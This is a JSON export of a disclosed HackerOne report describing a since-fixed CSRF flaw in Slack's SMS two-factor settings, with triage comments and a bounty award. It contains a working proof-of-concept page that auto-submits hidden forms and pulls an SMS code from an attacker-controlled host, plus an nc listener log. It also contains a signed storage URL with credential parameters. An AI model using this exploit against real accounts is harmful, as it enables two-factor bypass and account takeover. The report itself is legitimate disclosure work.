@@ -1,0 +1,529 @@
+{
+  "id": 155774,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xNTU3NzQ=",
+  "url": "https://hackerone.com/reports/155774",
+  "title": "CSRF - Add optional two factor mobile number",
+  "state": "Closed",
+  "substate": "resolved",
+  "readable_substate": "Resolved",
+  "created_at": "2016-08-01T10:54:51.599Z",
+  "submitted_at": "2016-08-01T10:54:51.599Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "nhavis",
+    "url": "/nhavis",
+    "profile_picture_urls": {
+      "small": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 69,
+    "url": "https://hackerone.com/slack",
+    "handle": "slack",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/000/069/683fee312381bc46cadc7ea1950abc87944d12c3_original.png/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/000/069/683fee312381bc46cadc7ea1950abc87944d12c3_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+    },
+    "permissions": [
+
+    ],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "profile": {
+      "name": "Slack",
+      "twitter_handle": "slackhq",
+      "website": "https://slack.com",
+      "about": "All your team communication in one place, instantly searchable, and available wherever you go."
+    }
+  },
+  "has_bounty?": true,
+  "in_validation?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [
+
+  ],
+  "singular_disclosure_disabled": true,
+  "disclosed_at": "2016-08-17T21:39:53.991Z",
+  "bug_reporter_agreed_on_going_public_at": "2016-08-12T00:02:41.505Z",
+  "team_member_agreed_on_going_public_at": "2016-08-17T21:39:53.836Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "Description\n====================\nAdding a mobile number for 2-factor authentication is vulnerable to CSRF, allowing an attacker to bypass 2-factor authentication. An attacker would be able to force the logged in user to add a new mobile number for 2-factor authentication. The attacker would then receive the SMS code and automatically make the victim verify it (in Javascript). When the attacker attempts to login to the victim's account, the verification code can then be sent to the attacker's mobile number. \n\nAn attacker could be anyone trying to bypass 2-factor authentication, for example:\n1. Anyone who already has the password to an account.\n2. A company's IT administrator who has access to the user's e-mail and can reset the password.\n\nI have provided a complete Proof of Concept without the **crumb** parameter, which I have manually verified myself.\n\nVulnerable URL:\n====================\n* /account/settings/2fa_sms\n\nRoot cause:\n====================\nServer does not validate the existence or value of the **crumb** parameter containing the CSRF token.\n\nSample vulnerable request:\n====================\n```\nPOST /account/settings/2fa_sms HTTP/1.1\nHost: cs-sa.slack.com\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:47.0) Gecko/20100101 Firefox/47.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\nAccept-Language: en-GB,en;q=0.5\nAccept-Encoding: gzip, deflate, br\nCookie: REDACTED=REDACTED\nConnection: close\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 109\n\nverify_two_factor=1&backup=&app=&primary_phone_number=%2B61+0421653999&country_code=AU&phone_number=421653999\n```\n\nAttack flow:\n====================\n1. Attacker sends logged in slack user a link and slack user clicks it.\n2. The link contains HTML and Javascript code that forces the victim in to adding a new 2-factor mobile number (**slackcsrf.html** provided below). The code does not contain the **crumb** parameter.\n3. The code also connects back to the attacker's machine waiting for the attacker to enter the code so it can be used for verification (within seconds and potentially automatically).\n4. The attacker receives the code via SMS and sends it back to the victim. (**Attacker web server** provided below)\n5. The HTML code forces the victim to verify the new mobile number.\n6. The mobile number has now been added to the victim's account for 2FA.\n7. The attacker logs in and bypasses 2FA by requesting the code with the secondary mobile number.\n\nslackcsrf.html:\n---------------------\n```\n<html>\n<body>\n<IFRAME style=\"display:none\" name=\"hidden-form\"></iframe>\n    <form action=\"https://cs-sa.slack.com/account/settings/2fa_sms\" method=\"POST\" target=\"hidden-form\" name=\"pocframe\">\n      <input type=\"hidden\" name=\"verify&#95;two&#95;factor\" value=\"1\" />\n      <input type=\"hidden\" name=\"backup\" value=\"\" />\n      <input type=\"hidden\" name=\"app\" value=\"\" />\n      <input type=\"hidden\" name=\"country&#95;code\" value=\"AU\" />\n      <input type=\"hidden\" name=\"phone&#95;number\" value=\"421653999\" />\n    </form>\n<script>document.pocframe.submit();</script>\n\n<script src=\"http://192.168.1.82:8080/a\"></script>\n<IFRAME style=\"display:none\" name=\"hidden-form2\"></iframe>\n    <form action=\"https://cs-sa.slack.com/account/settings/2fa_sms\" method=\"POST\" target=\"hidden-form2\" name=\"pocframe2\">\n      <input type=\"hidden\" name=\"verify&#95;two&#95;factor\" value=\"1\" />\n      <input type=\"hidden\" name=\"backup\" value=\"1\" />\n      <input type=\"hidden\" name=\"app\" value=\"\" />\n      <input type=\"hidden\" name=\"formatted&#95;phone&#95;number\" value=\"&#43;61&#32;421653999\" />\n      <input type=\"hidden\" name=\"country&#95;code\" value=\"AU\" />\n      <input type=\"hidden\" id=\"scode\" name=\"confirmation&#95;code\" value=\"\" />\n    </form>\n<script>\n\tdocument.getElementById(\"scode\").value = scode;\n\tdocument.pocframe2.submit();\n</script>\n</body>\n</html>\n```\n\nAttacker web server:\n---------------------\n```\nroot@foxtrotter:/var/www/html# nc -nlvp 8080\nlistening on [any] 8080 ...\nconnect to [192.168.1.82] from (UNKNOWN) [192.168.1.81] 56194\nGET /a HTTP/1.1\nHost: 192.168.1.82:8080\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:47.0) Gecko/20100101 Firefox/47.0\nAccept: */*\nAccept-Language: en-GB,en;q=0.5\nAccept-Encoding: gzip, deflate\nReferer: http://192.168.1.82/slackcsrf.html\nConnection: close\nCache-Control: max-age=0\n\nHTTP/1.1 200 OK\n\nscode=196206;\n```\n",
+  "bounty_amount": "500.0",
+  "formatted_bounty": "$500",
+  "weakness": {
+    "id": 45,
+    "name": "Cross-Site Request Forgery (CSRF)"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 108852,
+      "file_name": "slackcsrf.JPG",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/108/852/bc0782fd0be1df444d43fe8bf9af145bd579dec1/slackcsrf.JPG?response-content-disposition=attachment%3B%20filename%3D%22slackcsrf.JPG%22%3B%20filename%2A%3DUTF-8%27%27slackcsrf.JPG&response-content-type=image%2Fjpeg&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQXJ6D5F5L%2F20230923%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230923T081600Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEDAaCXVzLXdlc3QtMiJHMEUCIQDyP3EMkvTL0V6wTAvXT68cqPExihI2tf1xKvIQBLAgGQIgChCfiV8aqCpMhU25ctkvWGY92pvBfPR17F6tP9zzz9YqsgUIKRADGgwwMTM2MTkyNzQ4NDkiDFSK4MgRgfyw8Ls3lSqPBc15dmBku9gi%2BCKowlVcgedrfye0tu%2Fx1j0CjLpEjeiWrLjspN%2BSOgA2S18fCqOPkyvqnF%2FJqtOQ11yStizzcOHrMjIGmBiFd2uh2AQxjMEOATRd%2BtvkdhIGP0jSX%2B2hkExagmSyylow7gV%2BqgjUHCN16fdfmoa4p3RB%2FdtVnnK4s9kroID0O6aQliqzwXPCSpNN4EWDlP42e8a%2FuMmJXr%2Ft3yz%2FDV0Au8YnOIAALIyejGUU7Q3LVzSM6esTWTNtol3txZBSjUKLmgG45SqCnjhd1DYJ1VMhPaHv%2B51leg5qoYnbSwwyTrYDN%2FJwT7aIH%2BgLZ9NGCHJiVU%2BOUuooyiPSWE%2BdH7WVFkEiYLOr5y%2FG0zcdNGTPPNVAnPirdiuKZv0gyGDN8Bcvzp%2FrvBYNEK7W2ot7sNlFbuY39lN4qKTyOqCt5iackrYE8nKDY6OpQBVEejeyBNRHTWVfSjwPPwAh8%2F4to1J7q68Q4ZHlW4SoA9nHn7GPgrVHEme1reHQNEAisfZ%2FMT6sonQBj88%2FiJrPlfx%2FGDMEGXndSXYYZ7qfXqrmi3s12G42QJQ3MBVpByQJg%2BGYVluCmH%2FzTYT219Nl1JUae48YJU%2BdtDo3kWpIa6%2BwwXgYRKIQ337%2FJWDFuk1HxIu79qMRQZeKDKpAIOPJ1pFd1nWtn07HBQX08v1SPe5eScDzhwwELRGI95p%2FDzjsX3tv9uFrjwo6WPI3u98OEtOrswXaUU2iSx0d9QnkOMwnkSO%2FVDOusFq564cZMTip%2BL789juFh23AkZaruJMzkmoEwvFfCzA1dYmjR6EX3ujHsrdunub1eg4J%2BFJRvJ%2BK%2BkubKTubdAD20d9%2FSv3eo%2BXmZMlFprvdij%2FJx4Ewj6W6qAY6sQG6KlSAE8XQTNIipND5514nCatkaeOfD18B0bSzmtjwXZ7%2FXF2U7uWQ5NCNUaK2DTkEzo%2FhiTKNnDPI%2Frx6JGnB5loBPosllWp3WyrwrC0gSVmJdCM%2Fxcm8rvWiMGzm%2B7K9EH5QkmiOWj7Ufj2zd1lPLgMQ7vU0a3o%2FW4165LXUQMtqfkXwZ4j1K7xV%2BKYfeCC2U0SRmi92FjyS5gd4UGg0GN50j2TrWTXkNcBNZRJ8uiA%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=33f1028e5c0c29812b3430ad4c0b7c525fe72aabc06e887cf8b1e2d6a5232e34",
+      "file_size": 35102,
+      "type": "image/jpeg",
+      "moderated": null
+    }
+  ],
+  "allow_singular_disclosure_at": "2016-09-11T00:02:41.652Z",
+  "allow_singular_disclosure_after": -221904799.08319438,
+  "singular_disclosure_allowed": true,
+  "vote_count": 5,
+  "voters": [
+    "lucky_sen",
+    "kxyry",
+    "dudez",
+    "ibram",
+    "dyabla"
+  ],
+  "structured_scope": null,
+  "abilities": {
+    "assignable_team_members": [
+
+    ],
+    "assignable_team_member_groups": [
+
+    ]
+  },
+  "activities": [
+    {
+      "id": 1099410,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "This also works when a Slack user doesn't have 2FA enabled yet - this means the CSRF could be used in a mass Denial of Service attack as each victim would not be able to login to their account.",
+      "automated_response": false,
+      "created_at": "2016-08-01T11:19:27.033Z",
+      "updated_at": "2016-08-01T11:19:27.033Z",
+      "actor": {
+        "username": "nhavis",
+        "cleared": false,
+        "verified": false,
+        "url": "/nhavis",
+        "profile_picture_urls": {
+          "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "slack"
+    },
+    {
+      "id": 1102241,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "Can you confirm receipt of the issue?",
+      "automated_response": false,
+      "created_at": "2016-08-02T13:49:22.023Z",
+      "updated_at": "2016-08-02T13:49:22.023Z",
+      "actor": {
+        "username": "nhavis",
+        "cleared": false,
+        "verified": false,
+        "url": "/nhavis",
+        "profile_picture_urls": {
+          "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "slack"
+    },
+    {
+      "id": 1102650,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "Hi @nhavis,\n\nSorry for the delay here - we'll be triaging this shortly.\n\nThanks!\nMax",
+      "automated_response": false,
+      "created_at": "2016-08-02T17:10:41.605Z",
+      "updated_at": "2016-08-02T17:10:41.605Z",
+      "actor": {
+        "username": "maxfeldman",
+        "cleared": false,
+        "verified": false,
+        "url": "/maxfeldman",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/016/613/37b54dbac5da0a42db471713959c8bf2de89a12d_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "slack"
+    },
+    {
+      "id": 1102896,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::BugTriaged",
+      "message": "@nhavis we've triaged this and are working on a fix!",
+      "automated_response": false,
+      "created_at": "2016-08-02T19:37:43.593Z",
+      "updated_at": "2016-08-02T19:37:43.593Z",
+      "actor": {
+        "username": "maxfeldman",
+        "cleared": false,
+        "verified": false,
+        "url": "/maxfeldman",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/016/613/37b54dbac5da0a42db471713959c8bf2de89a12d_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "slack"
+    },
+    {
+      "id": 1103234,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "No worries.\n\nLet me know if there's any questions.",
+      "automated_response": false,
+      "created_at": "2016-08-02T23:25:20.700Z",
+      "updated_at": "2016-08-02T23:25:20.700Z",
+      "actor": {
+        "username": "nhavis",
+        "cleared": false,
+        "verified": false,
+        "url": "/nhavis",
+        "profile_picture_urls": {
+          "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "slack"
+    },
+    {
+      "id": 1105465,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "Do you have an ETA for the fix?\n\nThanks.",
+      "automated_response": false,
+      "created_at": "2016-08-04T09:08:01.334Z",
+      "updated_at": "2016-08-04T09:08:01.334Z",
+      "actor": {
+        "username": "nhavis",
+        "cleared": false,
+        "verified": false,
+        "url": "/nhavis",
+        "profile_picture_urls": {
+          "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "slack"
+    },
+    {
+      "id": 1105492,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "Hi @nhavis,\n\nWe actually believe we've patched this - would you mind verifying that the fix has made it to your environment?\n\nThanks!\nMax",
+      "automated_response": false,
+      "created_at": "2016-08-04T09:30:18.958Z",
+      "updated_at": "2016-08-04T09:30:18.958Z",
+      "actor": {
+        "username": "maxfeldman",
+        "cleared": false,
+        "verified": false,
+        "url": "/maxfeldman",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/016/613/37b54dbac5da0a42db471713959c8bf2de89a12d_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "slack"
+    },
+    {
+      "id": 1105756,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "Yes it's been fixed - the crumb parameter is now checked. How do we proceed?\n\nThanks",
+      "automated_response": false,
+      "created_at": "2016-08-04T12:57:18.182Z",
+      "updated_at": "2016-08-04T12:57:18.182Z",
+      "actor": {
+        "username": "nhavis",
+        "cleared": false,
+        "verified": false,
+        "url": "/nhavis",
+        "profile_picture_urls": {
+          "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "slack"
+    },
+    {
+      "id": 1111728,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "Can we resolve the issue?",
+      "automated_response": false,
+      "created_at": "2016-08-08T03:25:30.530Z",
+      "updated_at": "2016-08-08T03:25:30.530Z",
+      "actor": {
+        "username": "nhavis",
+        "cleared": false,
+        "verified": false,
+        "url": "/nhavis",
+        "profile_picture_urls": {
+          "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "slack"
+    },
+    {
+      "id": 1113642,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::BugResolved",
+      "message": "Sorry for the delay! We all just returned from Defcon :)",
+      "automated_response": false,
+      "created_at": "2016-08-08T21:46:12.142Z",
+      "updated_at": "2016-08-08T21:46:12.142Z",
+      "actor": {
+        "username": "maxfeldman",
+        "cleared": false,
+        "verified": false,
+        "url": "/maxfeldman",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/016/613/37b54dbac5da0a42db471713959c8bf2de89a12d_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "reporter": {
+        "username": "nhavis",
+        "url": "/nhavis"
+      },
+      "genius_execution_id": null,
+      "team_handle": "slack"
+    },
+    {
+      "id": 1113644,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::BountyAwarded",
+      "message": "Thanks for an interesting finding! Please keep up the good work :)\n\nThe Slack Security Team",
+      "automated_response": false,
+      "created_at": "2016-08-08T21:46:48.133Z",
+      "updated_at": "2016-08-08T21:46:48.133Z",
+      "actor": {
+        "url": "/slack",
+        "ibb": false,
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/000/069/683fee312381bc46cadc7ea1950abc87944d12c3_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+        },
+        "profile": {
+          "name": "Slack"
+        }
+      },
+      "bounty_amount": "500.0",
+      "bounty_currency": "usd",
+      "genius_execution_id": null,
+      "team_handle": "slack",
+      "collaborator": {
+        "username": "nhavis",
+        "url": "/nhavis"
+      }
+    },
+    {
+      "id": 1117031,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "Thanks.\n\nCan we make this public?",
+      "automated_response": false,
+      "created_at": "2016-08-10T13:24:16.423Z",
+      "updated_at": "2016-08-10T13:24:16.423Z",
+      "actor": {
+        "username": "nhavis",
+        "cleared": false,
+        "verified": false,
+        "url": "/nhavis",
+        "profile_picture_urls": {
+          "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "slack"
+    },
+    {
+      "id": 1118765,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "@nhavis - yes, you can go ahead and request disclosure. thanks!",
+      "automated_response": false,
+      "created_at": "2016-08-11T07:40:49.178Z",
+      "updated_at": "2016-08-11T07:40:49.178Z",
+      "actor": {
+        "username": "maxfeldman",
+        "cleared": false,
+        "verified": false,
+        "url": "/maxfeldman",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/016/613/37b54dbac5da0a42db471713959c8bf2de89a12d_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "slack"
+    },
+    {
+      "id": 1120764,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::AgreedOnGoingPublic",
+      "message": "Disclosure request.",
+      "automated_response": false,
+      "created_at": "2016-08-12T00:02:41.584Z",
+      "updated_at": "2016-08-12T00:02:41.584Z",
+      "first_to_agree": true,
+      "actor": {
+        "username": "nhavis",
+        "cleared": false,
+        "verified": false,
+        "url": "/nhavis",
+        "profile_picture_urls": {
+          "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "slack"
+    },
+    {
+      "id": 1131467,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "Hi,\n\nDid you get the disclosure request?",
+      "automated_response": false,
+      "created_at": "2016-08-17T09:57:29.528Z",
+      "updated_at": "2016-08-17T09:57:29.528Z",
+      "actor": {
+        "username": "nhavis",
+        "cleared": false,
+        "verified": false,
+        "url": "/nhavis",
+        "profile_picture_urls": {
+          "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "slack"
+    },
+    {
+      "id": 1133031,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::AgreedOnGoingPublic",
+      "message": "Thanks @nhavis!",
+      "automated_response": false,
+      "created_at": "2016-08-17T21:39:53.918Z",
+      "updated_at": "2016-08-17T21:39:53.918Z",
+      "actor": {
+        "username": "maxfeldman",
+        "cleared": false,
+        "verified": false,
+        "url": "/maxfeldman",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/016/613/37b54dbac5da0a42db471713959c8bf2de89a12d_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "slack"
+    },
+    {
+      "id": 1133032,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::ReportBecamePublic",
+      "message": "",
+      "automated_response": false,
+      "created_at": "2016-08-17T21:39:54.023Z",
+      "updated_at": "2016-08-17T21:39:54.023Z",
+      "actor": {
+        "username": "maxfeldman",
+        "cleared": false,
+        "verified": false,
+        "url": "/maxfeldman",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/016/613/37b54dbac5da0a42db471713959c8bf2de89a12d_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "slack"
+    }
+  ],
+  "activity_page_count": 1,
+  "activity_page_number": 1,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
